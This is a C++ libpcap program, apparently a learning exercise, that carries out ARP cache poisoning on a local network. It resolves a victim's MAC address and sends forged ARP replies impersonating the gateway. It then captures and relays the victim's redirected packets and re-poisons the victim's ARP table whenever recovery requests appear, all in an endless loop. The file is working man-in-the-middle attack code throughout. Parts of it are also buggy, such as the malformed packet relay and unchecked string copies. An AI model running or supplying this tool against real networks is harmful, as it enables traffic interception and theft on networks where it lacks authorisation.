#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <stdbool.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getmac.h"
#include "getIpAddr.h"


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct eth_hdr{
        unsigned char h_dest[6];        //destination ether addr
        unsigned char h_source[6];      //source ether addr
        unsigned short h_proto;         //packet type id filed
} __attribute__((packed));

struct arp_hdr{
    unsigned short ar_hrd;          //hardware type : ethernet
    unsigned short ar_pro;          //protocol      : ip
    unsigned char  ar_hln;          //hardware size
    unsigned char  ar_pln;          //protocal size
    unsigned short ar_op;           //opcode request or reply
    unsigned char  ar_sha[6];       //sender mac
    //unsigned int  ar_sip[4];       //sender IP
	struct in_addr ar_sip;
    unsigned char  ar_tha[6];       //Target mac (my)
    struct in_addr ar_tip;       //Target IP  (my)
} __attribute__((packed));

struct ip_hdr
{
    unsigned char ip_header_len:4;  /* header length */
    unsigned char ip_version:4;     /* version */
    unsigned char ip_tos;           /* type of service */
    unsigned short ip_total_length; /* total length */
    unsigned short ip_id;           /* identification */
    unsigned char ip_frag_offset:5; /* fragment offset field */
    unsigned char ip_reserved_zero:1;   /* reserved fragment flag */
    unsigned char ip_dont_fragment:1;   /* dont fragment flag */
    unsigned char ip_more_fragment:1;   /* more fragments flag */
    unsigned char ip_frag_offset1;      /* mask for fragmenting bits */
    unsigned char ip_ttl;           /* time to live */
    unsigned char ip_protocol;      /* protocol */
    unsigned short ip_checksum;     /* checksum */
    struct in_addr ip_srcaddr;      /* source address */
    struct in_addr ip_destaddr;     /* destination address */
} __attribute__((packed));


void usage() {
	printf("syntax: send-arp-test <interface> <senderIP> <targetIP>\n");
	printf("sample: send-arp-test wlan0 172.30.1.40 172.30.1.254\n");
}

int sendArpPacket(char* dev, char* eth_dmac, char* eth_smac, uint16_t my_arp_op,
                  char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac); // victim.mac a0:c5:89:77:cb:03
    packet.eth_.smac_ = Mac(eth_smac); // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(my_arp_op); // Request
    packet.arp_.smac_ = Mac(arp_smac); // me.mac
    packet.arp_.sip_ = htonl(Ip(arp_sip)); // me.ip
    //packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // victim.mac
    packet.arp_.tmac_ = Mac(arp_tmac); // victim.mac
    //packet.arp_.tip_ = htonl(Ip(argv[2])); // victim.ip
    packet.arp_.tip_ = htonl(Ip(arp_tip)); // victim.ip

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
    char* SENDER_IP = argv[2];
    char* TARGET_IP = argv[3];
    char broad_eth_dmac[18] = "ff:ff:ff:ff:ff:ff";
    char broad_arp_tmac[18] = "00:00:00:00:00:00";

    size_t myMacSize = strlen(getMacAddr(argv[1]))+1;
	char* myMacAddr = (char*)malloc(myMacSize);
	strncpy(myMacAddr, getMacAddr(argv[1]), myMacSize);
	
	char* myIpAddr = (char *)malloc(sizeof(char *));
	myIpAddr = getIpAddr(dev);


  while(true){
    // stage 1 -------arp-----------------------------------------
    sendArpPacket(dev, broad_eth_dmac, myMacAddr, ArpHdr::Request,
                  myMacAddr, myIpAddr, broad_arp_tmac, SENDER_IP);
    // endof stage 1 ------------------------------------------------
	
    /*
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	// get victim's Mac Address
	EthArpPacket packet;
    
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // victim.mac a0:c5:89:77:cb:03
	packet.eth_.smac_ = Mac(myMacAddr); // me
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // Request
	packet.arp_.smac_ = Mac(myMacAddr); // me.mac
	packet.arp_.sip_ = htonl(Ip(myIpAddr)); // me.ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // victim.mac
    packet.arp_.tip_ = htonl(Ip(SENDER_IP)); // victim.ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
    
	pcap_close(handle);
    */


    // stage 2 ------------------------------------------------
    // filter with conditions ehdr_dmac, ehdr_proto, ahdr_op, ahdr_sip
	char errbuf1[PCAP_ERRBUF_SIZE];
    pcap_t* handle1 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf1);
    if (handle1 == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf1);
        return -1;
    }
	static char* victimMacAddr;
	//char* tempMac;
	
    while (true) {
    	struct pcap_pkthdr* header;
		struct eth_hdr* ehdr;
		struct arp_hdr* ahdr;


		short ehdr_proto;
        const u_char* packet0;

        int res = pcap_next_ex(handle1, &header, &packet0);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle1));
            break;
        }
        ehdr = (struct eth_hdr *)packet0;

        size_t ehdr_dmac_2_size = strlen(ether_ntoa((struct ether_addr *)ehdr->h_dest))+1;
        char* ehdr_dmac_2 = (char*)malloc(ehdr_dmac_2_size);
        strncpy(ehdr_dmac_2, ether_ntoa((struct ether_addr *)ehdr->h_dest), ehdr_dmac_2_size);

        ehdr_proto = htons(ehdr->h_proto);
		packet0 += 14;
		ahdr = (struct arp_hdr *)packet0;

		unsigned short ahdr_op = htons(ahdr->ar_op);
		char* ahdr_sip = inet_ntoa((ahdr->ar_sip));

        printf("=============================================\n");
        printf("ehdr_dmac : %s\n", ehdr_dmac_2);
		printf("ehdr_proto : %u\n", ehdr_proto);
		printf("adhr_op : %u\n", ahdr_op);
        printf("adhr_sip : %s\n", ahdr_sip);

        int cmp = strcmp(ehdr_dmac_2, myMacAddr);
        int cmp2 = strcmp(ahdr_sip, SENDER_IP);
		bool flag1 = cmp ? 0 : 1;
		bool flag2 = ehdr_proto == 2054;
		bool flag3 = ahdr_op == 2;
        //bool flag4 = *ahdr_sip == *SENDER_IP;
        bool flag4 = cmp2 == 0 ? 1 : 0;

		printf("flag : %d %d %d %d\n", flag1, flag2, flag3, flag4);
 
		if(flag1 && flag2 && flag3 && flag4){
			size_t tempSize = strlen(ether_ntoa((const struct ether_addr *)(ahdr->ar_sha)))+1;
			victimMacAddr = (char*)malloc(tempSize);
			strncpy(victimMacAddr, ether_ntoa((const struct ether_addr *)(ahdr->ar_sha)), tempSize);

			break;
		}
    }

    pcap_close(handle1);
    //endof stage 2 -------------------------

    /*
	char errbuf2[PCAP_ERRBUF_SIZE];
	pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf2);
	if (handle2 == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf2);
		return -1;
	}

	EthArpPacket packet1;
    
	packet1.eth_.dmac_ = Mac(victimMacAddr); // victim.mac // 
	packet1.eth_.smac_ = Mac(myMacAddr); // me
	packet1.eth_.type_ = htons(EthHdr::Arp);
	
	packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet1.arp_.pro_ = htons(EthHdr::Ip4);
	packet1.arp_.hln_ = Mac::SIZE;
	packet1.arp_.pln_ = Ip::SIZE;
	packet1.arp_.op_ = htons(ArpHdr::Reply); // Reply 
	packet1.arp_.smac_ = Mac(myMacAddr); // me.mac
    packet1.arp_.sip_ = htonl(Ip(TARGET_IP)); // gateway.ip
	packet1.arp_.tmac_ = Mac(victimMacAddr); // victim.mac // 
    packet1.arp_.tip_ = htonl(Ip(SENDER_IP)); // victim.ip

	int res1 = pcap_sendpacket(handle2, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
	if (res1 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle2));
	}
    

	pcap_close(handle2);
    */
    // stage 3 ------------------------------------------------
    sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
                  myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP);
    // endof stage 3 ------------------------------------------


    // stage 4 ------------------------------------------------
    char errbuf4[PCAP_ERRBUF_SIZE];
    pcap_t* handle4 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf4);
    if (handle4 == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf4);
        return -1;
    }


    while (true) {
        struct pcap_pkthdr* header;
        struct eth_hdr* ehdr;
        struct ip_hdr* ihdr;

        char* ehdr_dmac_4;
        char ehdr_smac_4[40] = {0, }; // plz check again
        short ehdr_proto_4; //
        char ihdr_sip_4[40];
        char ihdr_dip_4[40];
        const u_char* packet4;

        int res = pcap_next_ex(handle4, &header, &packet4);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle4));
            break;
        }
        ehdr = (struct eth_hdr *)packet4;

        strcpy(ehdr_smac_4, ether_ntoa((struct ether_addr *)ehdr->h_source));

        size_t ehdr_dmac_4_size = strlen(ether_ntoa((struct ether_addr *)ehdr->h_dest))+1;
        ehdr_dmac_4 = (char*)malloc(ehdr_dmac_4_size);
        strncpy(ehdr_dmac_4, ether_ntoa((struct ether_addr *)ehdr->h_dest), ehdr_dmac_4_size);

        ehdr_proto_4 = htons(ehdr->h_proto);
        packet4 += 14;
        ihdr = (struct ip_hdr *)packet4;

        strcpy(ihdr_sip_4, inet_ntoa((ihdr->ip_srcaddr)));
        strcpy(ihdr_dip_4, inet_ntoa((ihdr->ip_destaddr)));

        printf("stage 4 =====================================\n");
        printf("ehdr_smac_4 : %s\n", ehdr_smac_4); // desired value : 00:07:89:63:05:5d
        printf("ehdr_proto_4 : %u\n", ehdr_proto_4);
        printf("idhr_sip_4 : %s\n", ihdr_sip_4); // desired value : 172.30.1.40
        //printf("idhr_dip_4 : %s\n", ihdr_dip_4); // desired value : 172.30.1.254

        int cmp = strcmp(ehdr_smac_4, victimMacAddr);
        bool flag1 = cmp ? 0 : 1; // ehdr_smac
        bool flag2 = strcmp(ehdr_dmac_4, myMacAddr) == 0 ? 1 : 0; // ihdr_sip
        bool flag3 = ehdr_proto_4 == 2048; // ehdr_protocol
        //bool flag3 = ihdr_op == 2;
        bool flag4 = strcmp(ihdr_sip_4, SENDER_IP) == 0 ? 1 : 0; // ihdr_sip
        //bool flag4 = strcmp(ihdr_dip_4, TARGET_IP) == 0 ? 1 : 0;
        printf("spoofed packet flag : %d %d %d %d\n", flag1, flag2, flag3, flag4);

        /* you must distinguish BROADCAST packet from what you want to capture */
        if(flag1 && flag2 && flag3 && flag4){
            // stage 5------------------------------------
            char errbuf5[PCAP_ERRBUF_SIZE];
            pcap_t* handle5 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf5);
                if (handle5 == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf5);
                return -1;
            }

            int ihdr_payload_len = ntohs(ihdr->ip_total_length) -
                    (ihdr->ip_header_len)*4;

            int res = pcap_sendpacket(handle5, reinterpret_cast<const u_char*>(ihdr), ihdr_payload_len);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle5));
            }

            pcap_close(handle5);
            // endof stage 5 -----------------------------

            break;
        }
    }

    pcap_close(handle4);
    // endof stage 4 ------------------------------------------

    // stage 6 ------------------------------------------------
    char errbuf6[PCAP_ERRBUF_SIZE];
    pcap_t* handle6 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf6);
    if (handle6 == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf6);
        return -1;
    }


    while (true) {
        struct pcap_pkthdr* header;
        struct eth_hdr* ehdr;
        struct arp_hdr* ahdr;

        char* ehdr_dmac_6;
        char ehdr_smac_6[40] = {0, }; // plz check again
        short ehdr_proto_6; //
        char ahdr_sip_6[40];
        char ahdr_tip_6[40];
        const u_char* packet6;

        int res = pcap_next_ex(handle6, &header, &packet6);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle6));
            break;
        }
        ehdr = (struct eth_hdr *)packet6;

        strcpy(ehdr_smac_6, ether_ntoa((struct ether_addr *)ehdr->h_dest));

        size_t ehdr_dmac_6_size = strlen(ether_ntoa((struct ether_addr *)ehdr->h_dest))+1;
        ehdr_dmac_6 = (char*)malloc(ehdr_dmac_6_size);
        strncpy(ehdr_dmac_6, ether_ntoa((struct ether_addr *)ehdr->h_dest), ehdr_dmac_6_size);

        ehdr_proto_6 = htons(ehdr->h_proto);
        packet6 += 14;
        ahdr = (struct arp_hdr *)packet6;

        strcpy(ahdr_sip_6, inet_ntoa((ahdr->ar_sip)));
        strcpy(ahdr_tip_6, inet_ntoa((ahdr->ar_tip)));

        printf("stage 6 \n");
        printf("ehdr_dmac_6 : %s\n", ehdr_dmac_6); // desired value : 00:07:89:63:05:5d
        printf("ehdr_proto_6 : %u\n", ehdr_proto_6);
        printf("adhr_sip_6 : %s\n", ahdr_sip_6); // desired value : 172.30.1.40
        printf("adhr_dip_6 : %s\n", ahdr_tip_6); // desired value : 172.30.1.254

        bool flag1 = strcmp(ehdr_dmac_6, myMacAddr) == 0 ? 1 : 0; // ehdr_dmac
        bool flag2 = ehdr_proto_6 == 2054; // ehdr_prototype
        bool flag3 = ahdr->ar_op == 1; // ahdr_op
        bool flag4 = strcmp(ahdr_sip_6, SENDER_IP) == 0 ? 1 : 0; // ahdr_sip
        bool flag5 = strcmp(ahdr_tip_6, TARGET_IP) == 0 ? 1 : 0; // ahdr_tip
        //printf("flag : %d %d %d %d %d\n", flag1, flag2, flag3, flag4, flag5);

        bool flag1_ver2 = strcmp(ehdr_dmac_6, broad_eth_dmac) == 0 ? 1 : 0;
        bool flag6 = strcmp(ahdr_tip_6, broad_arp_tmac) == 0 ? 1 : 0;

        if(flag1 && flag2 && flag3 && flag4 && flag5){
            printf("unicast arp-table recovering trial\n");
            // stage 7------------------------------------
            sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
                          myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP);
            // endof stage 7 -----------------------------

            break;
        }

        if(flag1_ver2 && flag2 && flag3 && flag4 && flag5 && flag6){
            printf("broadcast arp-table recovering trial\n");
            // stage 8------------------------------------
            sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
                          myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP);
            // endof stage 8 -----------------------------

            break;
        }
        //unicast   - ether_dmac, ether_protocol, arp_op, arp_sip, arp_tip
        //broadcast - ether_dmac_ver2, ether_protocol, arp_op, arp_sip, arp_tip, arp_dmac
    }

    pcap_close(handle6);
    // endof stage 6 ------------------------------------------
  }
}
